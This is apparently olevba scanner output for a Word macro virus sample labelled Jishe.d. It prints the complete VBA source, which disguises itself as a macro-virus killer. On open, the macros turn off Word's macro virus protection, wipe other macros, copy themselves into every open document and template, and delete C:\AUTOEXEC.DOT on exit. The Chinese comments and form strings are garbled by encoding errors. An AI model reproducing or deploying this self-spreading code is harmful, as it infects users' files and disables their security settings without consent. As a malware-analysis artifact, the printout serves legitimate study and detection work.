olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'侶角굶훙欺構齡鱗돨寧몸브깹뗀렝�교坰�,劍옵鹿렝岺꼬롸WORD브깹뗀돨먁횡
'侶矜狼唐댕좆돨브깹뗀景瀝쯤鱗槨弩앴,흔벎콱랙君唐굶磊춰轟콘槨제돨브깹뗀
'먁剋퀭섟珂宅乖젬溝,콱冷옵鹿菱朞錦맣굶넋埼,鹿속퓻굶磊춰돨묘제
'宅깹뗀鱗떱轢앎흔谿둬徒�瀯掃멂�,矜狼댕소돨묾谿클제
'뻑短속흙페櫓깻냥槨寧츰濫却,冷冀콱攣角댕소퍅덤綠씹돨澹却
'넋埼�雍�: 섹�台�
'곗무든뺐:
'怒쳉뒈囹: club@263.net
Option Explicit '넋埼櫓돨긴좆극伎邱땍屢빈賈痰
Const answer0 = "FreeWordMacroVirusKiller" '괏넣宅鹿품경굶돨쇗휭昑
Const answer1 = "MyMacroVirusKillerV1.0"
Const answer2 = "MyMacroVirusKillerV2.0"
Const answer3 = "MyMacroVirusKillerV2.2" '굶넋埼깃羚
'Version 2.0
Private Sub Document_Open()
    CloseVirusProtection
    '쇱꿴댔역돨匡도櫓角뤠唐깹뗀
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'侶角굶훙欺構齡鱗돨寧몸브깹뗀렝�교坰�,劍옵鹿렝岺꼬롸WORD브깹뗀돨먁횡
'侶矜狼唐댕좆돨브깹뗀景瀝쯤鱗槨弩앴,흔벎콱랙君唐굶磊춰轟콘槨제돨브깹뗀
'먁剋퀭섟珂宅乖젬溝,콱冷옵鹿菱朞錦맣굶넋埼,鹿속퓻굶磊춰돨묘제
'宅깹뗀鱗떱轢앎흔谿둬徒�瀯掃멂�,矜狼댕소돨묾谿클제
'뻑短속흙페櫓깻냥槨寧츰濫却,冷冀콱攣角댕소퍅덤綠씹돨澹却
'넋埼�雍�: 섹�台�
'곗무든뺐:
'怒쳉뒈囹: club@263.net
Option Explicit '넋埼櫓돨긴좆극伎邱땍屢빈賈痰
Public pVirusReport As String '깹뗀췄甘斤口
Private Const cMyID As String = "MyMacroVirusKiller" '굶넋埼덜쯤깃羚
Private Const cMyVersion As String = "V2.2" '굶넋埼경굶깃硫
Private Const cMyModule As String = "JiShenhua" '굶넋埼돨친욥츰냔
Private Const cMyUserForm As String = "VirusReport" '굶넋埼돨痰빵눗왯츰냔
Private Const cLinesofThisDocument As Integer = 25 '瞳ThisDocument친욥櫓홍꼬덜쯤돨契鑒
Private Const cOK As Integer = 0 '寧학攣끽
Private Const cDocHasModuleElse As Integer = 1 '唐페儉친욥닸瞳
Private Const cDocHasCodeElse As Integer = 2 '瞳ThisDocument친욥櫓唐페儉덜쯤닸瞳
Private Const cDocHasAllElse As Integer = 3 '瞳ThisDocument친욥櫓唐페儉덜쯤닸瞳，깻唐페儉친욥닸瞳
Private Const cDocProtected As Integer = 4 '맡匡도굳괏빱
Public Const cDocHasOldVersion As Integer = 8  '맡匡도櫓唐앉경굶맡�굉《씻？�
'댔역匡도珂菱땡獵契
Sub AutoOpen()
    CloseVirusProtection
    '쇱꿴댔역돨匡도櫓角뤠唐깹뗀,흔벎唐깹뗀，蕨痰빵瓊놔괩멩
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
'劤쉔匡도珂菱땡獵契
Sub AutoNew()
    CloseVirusProtection
    Infect Word.ActiveDocument
End Sub
'밑균WORD裂품헌잿autoexec.dot匡숭櫓돨깹뗀
Sub AutoExit()
    Const AutoDotFile = "C:\AUTOEXEC.DOT"
    If Dir(AutoDotFile) <> "" Then
        Kill AutoDotFile
    End If
End Sub
'닒寧땍匡숭櫓蕨杰唐댔역匡도섟친겼櫓릿齡굶넋埼덜쯤섟친욥
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    '蕨댔역돨匡도櫓畇흙굶덜쯤
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    '蕨WORD친겼櫓畇흙굶덜쯤
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'헌뇜杰唐댔역匡도섟친겼櫓돨깹뗀친욥섟덜쯤
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean
    
    ClearVirus = True
    '쇱꿴杰唐匡도깻헌뇜
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "깹뗀헌뇜묏鱗꼇냥묘，헝쇱꿴覩凜。", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '쇱꿴杰唐친겼깻헌뇜
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "깹뗀헌뇜묏鱗꼇냥묘，헝쇱꿴覩凜。", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'쇱꿴杰唐댔역돨匡도섟친겼櫓角뤠唐깹뗀닸瞳，흔벎唐，럿쀼깹뗀斤口췄甘俚륜눔
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = 0
    pVirusReport = ""
    '쇱꿴杰唐댔역돨匡도櫓角뤠唐깹뗀
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected, cDocHasOldVersion
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "변鑒ScanDocument럿쀼댄轎덜쯤，溝固轟랬街깎。", vbOKOnly, "溝固놔댄"
        End Select
    Next myDoc
    '쇱꿴杰唐친겼
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected, cDocHasOldVersion
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "변鑒ScanDocument럿쀼댄轎덜쯤，溝固轟랬街깎。", vbOKOnly, "溝固놔댄"
        End Select
    Next myTemp
End Function
'겉굶넋埼덜쯤닒寧몸匡숭릿齡돕쥼寧몸匡숭櫓
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '쇱꿴꽝鑒잚謹角뤠攣횅
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "賈痰鑒앴잚謹" + myStr + "딧痰변鑒Infect，溝固怜豚冀賈痰Document섟Template잚謹。", vbOKOnly, "溝固댄轎"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function '커깃匡숭宅都匡숭宮谿珂꼇獵契畇흙꾸鱗
    If Infected(TargetFile) Then Exit Function '커깃匡숭綠쒔닸瞳굶넋埼덜쯤
    If TargetFile.VBProject.Protection Then Exit Function '커깃匡숭굳괏빱，꼇콘獵契畇흙꾸鱗
    Infect = False
    
    '헌뇜커깃匡도櫓綠쒔닸瞳돨페儉친욥섟덜쯤
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then xItem.codemodule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    '蕨匡도櫓畇흙굶넋埼덜쯤섟친욥
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '맡넋埼뙈흔벎렴瞳품좃몸刀얌裂품，앎삔돔鈴VBA32.DLL넋埼놔君鈴츱댄轎랍价샙，
    '헨乖裂귄�該潟潔�駱，꼇列부믐，莖컴！莖잿부瞳？
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).codemodule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).codemodule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).codemodule.InsertLines 1, myStr
    
    Infect = True
End Function
'쇱꿴寧땍匡도櫓角뤠綠쒔唐굶넋埼덜쯤
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim BeInfected As Integer
    Dim myType As String, NewVersion As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "賈痰鑒앴잚謹" + myType + "딧痰변鑒Infected，溝固怜豚冀賈痰Document섟Template잚謹。", vbOKOnly, "溝固댄轎"
        Infected = True
        Exit Function
    End If
    
    '쇱꿴커깃匡도角뤠굳괏빱
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    '뎠ThisDocument,myModule,myUserForm엇닸瞳珂，깊刻맡匡숭綠쒔굳먁횡
    BeInfected = 0
    NewVersion = cMyID & cMyVersion
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If (LinesofCode > 0) And (xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1)) Then
                BeInfected = BeInfected Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            BeInfected = BeInfected Or 2
        ElseIf xItem.Name = cMyUserForm Then
            BeInfected = BeInfected Or 4
        End If
    Next xItem
    If BeInfected = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'쇱꿴寧땍돨댔역匡도섟친겼櫓角뤠唐깹뗀닸瞳
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer, NewVersion As String
    
    ScanDocument = cOK
    NewVersion = cMyID & cMyVersion
    '쇱꿴꽝鑒잚謹角뤠攣횅
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "딧痰변鑒ScanDocument怜콘賈痰Document섟Template鑒앴잚謹。", vbOKOnly, "溝固댄轎"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "쇱꿴써벎：" + vbCrLf
    '쇱꿴넋埼친욥角뤠굳괏빱
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  匡숭櫓돨넋埼덜쯤굳괏빱，溝固轟랬菱땡꿴�괏Уヒ꼬�콘닸瞳깹뗀，헝鬼懃！" + vbCrLf
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '늪꼬롸唐덜쯤珂，흔벎悧契鑒낚놔죄방땍돨契鑒샀諒冷꼇돕굶친욥깃羚橙훰땍槨깹뗀
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then
                If (LinesofCode > cLinesofThisDocument) Then
                    ScanDocument = ScanDocument Or cDocHasCodeElse
                    myStr = myStr + "  <" + xItem.Name + ">뚤蹶櫓唐페儉넋埼닸瞳，댕매角깹뗀。" + vbCrLf
                ElseIf Not xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1) Then '꿴冷角뤠唐劤경굶닸瞳
                    If xItem.codemodule.Find(cMyID, 1, 1, 1 + LinesofCode, 1) Then '꿴冷角뤠唐앉경굶닸瞳
                        ScanDocument = cDocHasOldVersion
                    Else
                        ScanDocument = ScanDocument Or cDocHasCodeElse
                        myStr = myStr + "  <" + xItem.Name + ">뚤蹶櫓唐페儉넋埼닸瞳，댕매角깹뗀。" + vbCrLf
                    End If
                End If
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            '匡도櫓뇜굶친욥덜쯤裂棍，흔벎뻘唐페劍덜쯤橙훰땍槨깹뗀
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  唐페儉친욥<" + xItem.Name + ">닸瞳，섐唐옵콘角깹뗀。" + vbCrLf
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "청唐깹뗀，헝렴懃賈痰。" + vbCrLf
    pVirusReport = pVirusReport + myStr
End Function
'헌뇜寧땍돨댔역匡도섟친겼櫓돨깹뗀친욥섟덜쯤
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    Dim NewVersion As String
    
    ClearDocument = False
    '쇱꿴꽝鑒잚謹角뤠攣횅
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "딧痰변鑒ClearDocument怜콘賈痰Document섟Template鑒앴잚謹。", vbOKOnly, "溝固댄轎"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '쇱꿴匡도角뤠唐깹뗀
    NewVersion = cMyID & cDocHasOldVersion
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.codemodule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.codemodule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
'밑균Word브깹뗀괏빱묘콘
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function

-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















'눗竟넋埼덜쯤
Option Explicit '넋埼櫓돨긴좆극伎邱땍屢빈賈痰
'댔역눗竟珂獵契돨꾸鱗
Private Sub UserForm_Initialize()
    CheckBox1.Value = True
    Information.Value = pVirusReport
    Beep
End Sub
'밑균눗竟，꼇鱗훨부뇹잿
Private Sub CommandButtonNothing_Click()
    Dim ret As Integer
    ret = MsgBox("쥴돔，祛횔콱옵콘삔툽팀乖，뎃뻘角狼멩据콱，侶湳隣角붤誇麴돨。" & vbCrLf & "角뤠廬돨꼇隣뇹잿，헝툽刻。", vbYesNo + vbDefaultButton2, "疼늴괩멩！")
    If ret = vbYes Then
        Unload Me
    End If
End Sub
'댔역VisulBasic긍서포
Private Sub CommandButtonOpenVisubasic_Click()
    ShowVisualBasicEditor = True
End Sub
'�굉《�
Private Sub CommandButtonKill_Click()
    If ClearVirus Then
        ResetMenu
        InfectAll
        Unload Me
        MsgBox "객亮퀭돨寧刻，乖綠쒔겉옵콘角깹뗀돨땜땜홍꼬헌잿供귄，" & vbCrLf & "꼇법冷옵콘봤懃곗죄뻐慤，컸옵꼇狼밍乖鍛。", vbOKOnly, "괩멩！"
    Else
        MsgBox "꼇列痂척覩凜，헌뇜깹뗀묏鱗꼇냥묘，헝퀭癎묏쇱꿴샀宅乖젬溝。", vbOKOnly, "섹�台は織該㉧汝�"
        Unload Me
    End If
End Sub
'뿟릿굳깹뗀뫘맣돨꽉데淃
Private Function ResetMenu()
    Dim mItem, cItem, myKey As KeyBinding
    
    CustomizationContext = NormalTemplate
    'Alt+F8:댔역브뚤뺐움
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    'Alt+F11:댔역VisualBasic긍서포
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyH)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyK)).Clear

    '뿟릿묏야꽉데돨覩迦�阮�
    For Each mItem In CommandBars("Tools").Controls
        mItem.Reset
    Next mItem
    For Each cItem In CommandBars("Visual Basic").Controls
        cItem.Reset
    Next cItem
    For Each cItem In CommandBars
        If cItem.Visible = True Then
            cItem.Protection = msoBarNoProtection
        End If
    Next cItem
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.d-b9e6bbaccd480126937770d5d7c8887b498b25af' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

